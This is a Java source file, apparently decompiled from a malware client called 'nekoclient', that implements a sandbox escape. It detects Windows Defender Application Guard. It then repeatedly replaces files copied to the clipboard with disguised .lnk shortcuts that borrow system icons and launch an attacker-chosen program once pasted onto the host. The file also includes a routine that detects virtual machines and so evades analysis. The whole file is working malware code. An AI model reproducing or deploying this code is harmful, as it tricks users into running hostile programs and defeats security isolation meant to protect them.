package dev.neko.nekoclient.api.windows.vmescape;

import dev.neko.nekoclient.api.windows.FileDescriptor;
import dev.neko.nekoclient.api.windows.WindowsHook;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.File;
import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import mslinks.ShellLink;
import mslinks.ShellLinkHelper;
import oshi.SystemInfo;
import oshi.hardware.HardwareAbstractionLayer;

public class VMEscape {
   private static final DataFlavor CUSTOM_FLAVOR;
   private final ScheduledExecutorService executorService;
   private final File storageFile;
   private final Path targetApplication;
   private final String[] arguments;
   public static final char[] disallowedCharacters;

   public VMEscape(File storageFile, Path targetApplication, String... arguments) {
      this.storageFile = storageFile;
      this.targetApplication = targetApplication;
      this.arguments = arguments;
      this.executorService = Executors.newSingleThreadScheduledExecutor();
   }

   public boolean shouldRun() {
      return WindowsHook.isAvailable() && Objects.equals(System.getProperty("user.name"), "WDAGUtilityAccount");
   }

   public void run() {
      if (this.shouldRun()) {
         VMEscape.Icon defaultIcon = new VMEscape.Icon("SHELL32", 0, null);
         VMEscape.Icon folderIcon = new VMEscape.Icon("SHELL32", 4, null);
         List<VMEscape.Icon> icons = Arrays.asList(
            new VMEscape.Icon("USER32", 0, "exe"),
            new VMEscape.Icon("SHELL32", 69, "ini"),
            new VMEscape.Icon("SHELL32", 70, "txt"),
            new VMEscape.Icon("SHELL32", 71, "bat"),
            new VMEscape.Icon("SHELL32", 71, "cmd"),
            new VMEscape.Icon("SHELL32", 325, "png"),
            new VMEscape.Icon("SHELL32", 325, "jpg"),
            new VMEscape.Icon("SHELL32", 325, "jpeg")
         );
         Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
         this.executorService
            .scheduleAtFixedRate(
               () -> {
                  try {
                     Transferable clipboardContents = clipboard.getContents(null);
                     if (clipboardContents.isDataFlavorSupported(CUSTOM_FLAVOR)) {
                        return;
                     }
      
                     FileDescriptor[] fileDescriptors = WindowsHook.retrieveClipboardFiles();
                     if (fileDescriptors.length == 0) {
                        return;
                     }
      
                     final File tempDirectory = Files.createTempDirectory(this.storageFile.toPath(), "storage-").toFile();
                     tempDirectory.mkdirs();
      
                     for(FileDescriptor fileDescriptor : fileDescriptors) {
                        String[] split = fileDescriptor.getName().split(String.format("\\%s", FileSystems.getDefault().getSeparator()));
                        if (split.length <= 1) {
                           File file = new File(tempDirectory, String.format("%s.lnk", fileDescriptor.getName()));
                           String[] extensionSplit = fileDescriptor.getName().split("\\.");
                           String extension = extensionSplit[extensionSplit.length - 1];
                           VMEscape.Icon icon = fileDescriptor.isDirectory()
                              ? folderIcon
                              : icons.stream().filter(icon1 -> Objects.equals(icon1.getExtension().toLowerCase(), extension)).findFirst().orElse(defaultIcon);
                           ShellLink shellLink = new ShellLink()
                              .setName(fileDescriptor.getName())
                              .setIconLocation(String.format("%s\\System32\\%s.dll", System.getenv("WINDIR"), icon.getDll()))
                              .setWorkingDir(this.targetApplication.getParent().toAbsolutePath().toString())
                              .setCMDArgs(String.join(" ", this.arguments));
                           shellLink.getHeader().setIconIndex(icon.getIndex());
                           new ShellLinkHelper(shellLink)
                              .setLocalTarget(
                                 this.targetApplication.getRoot().toString(),
                                 this.targetApplication.subpath(0, this.targetApplication.getNameCount()).toString()
                              )
                              .saveTo(file.getAbsolutePath());
                        }
                     }
      
                     clipboard.setContents(new Transferable() {
                        @Override
                        public DataFlavor[] getTransferDataFlavors() {
                           return new DataFlavor[]{DataFlavor.javaFileListFlavor, VMEscape.CUSTOM_FLAVOR};
                        }
      
                        @Override
                        public boolean isDataFlavorSupported(DataFlavor flavor) {
                           return Objects.equals(flavor, DataFlavor.javaFileListFlavor) || Objects.equals(flavor, VMEscape.CUSTOM_FLAVOR);
                        }
      
                        @Override
                        public Object getTransferData(DataFlavor flavor) throws UnsupportedFlavorException, IOException {
                           if (Objects.equals(flavor, DataFlavor.javaFileListFlavor)) {
                              return Arrays.asList(tempDirectory.listFiles());
                           } else if (Objects.equals(flavor, VMEscape.CUSTOM_FLAVOR)) {
                              return "neko";
                           } else {
                              throw new UnsupportedFlavorException(flavor);
                           }
                        }
                     }, null);
                  } catch (Throwable var18) {
                  }
               },
               10L,
               10L,
               TimeUnit.MILLISECONDS
            );
      }
   }

   public void stop() {
      this.executorService.shutdownNow();
   }

   public static boolean isVirtualMachine() {
      try {
         SystemInfo systemInfo = new SystemInfo();
         HardwareAbstractionLayer hardware = systemInfo.getHardware();
         if (hardware.getComputerSystem().getBaseboard().getVersion().startsWith("Hyper-V")
            || hardware.getComputerSystem().getFirmware().getVersion().startsWith("VRTUAL")
            || Objects.equals(hardware.getComputerSystem().getModel(), "Virtual Machine")
            || hardware.getGraphicsCards().stream().anyMatch(graphicsCard -> Objects.equals(graphicsCard.getName(), "Microsoft Remote Display Adapter"))
            || hardware.getDiskStores().stream().anyMatch(diskStore -> diskStore.getModel().startsWith("Microsoft Virtual Disk"))
            || hardware.getMemory()
               .getPhysicalMemory()
               .stream()
               .anyMatch(physicalMemory -> Objects.equals(physicalMemory.getManufacturer(), "Microsoft Corporation"))) {
            return true;
         }
      } catch (Throwable var2) {
      }

      return false;
   }

   public static String makeValid(String path) {
      int index;
      for(char c : disallowedCharacters) {
         while((index = path.indexOf(c)) != -1) {
            path = path.substring(index + 1);
         }
      }

      char[] chars = path.toCharArray();

      for(int i = 0; i < chars.length; ++i) {
         char c = chars[i];
         if (c < ' ') {
            path = path.substring(i + 1);
         }
      }

      return path;
   }

   public final ExecutorService getExecutorService() {
      return this.executorService;
   }

   public final File getStorageFile() {
      return this.storageFile;
   }

   public final Path getTargetApplication() {
      return this.targetApplication;
   }

   public final String[] getArguments() {
      return this.arguments;
   }

   static {
      try {
         CUSTOM_FLAVOR = new DataFlavor("application/x-neko; class=java.lang.String");
      } catch (ClassNotFoundException var1) {
         throw new RuntimeException(var1);
      }

      disallowedCharacters = "<>:\"|?* ".toCharArray();
   }

   public static class Icon {
      private final String dll;
      private final int index;
      private final String extension;

      public Icon(String dll, int index, String extension) {
         this.dll = dll;
         this.index = index;
         this.extension = extension;
      }

      public final String getDll() {
         return this.dll;
      }

      public final int getIndex() {
         return this.index;
      }

      public final String getExtension() {
         return this.extension;
      }
   }
}
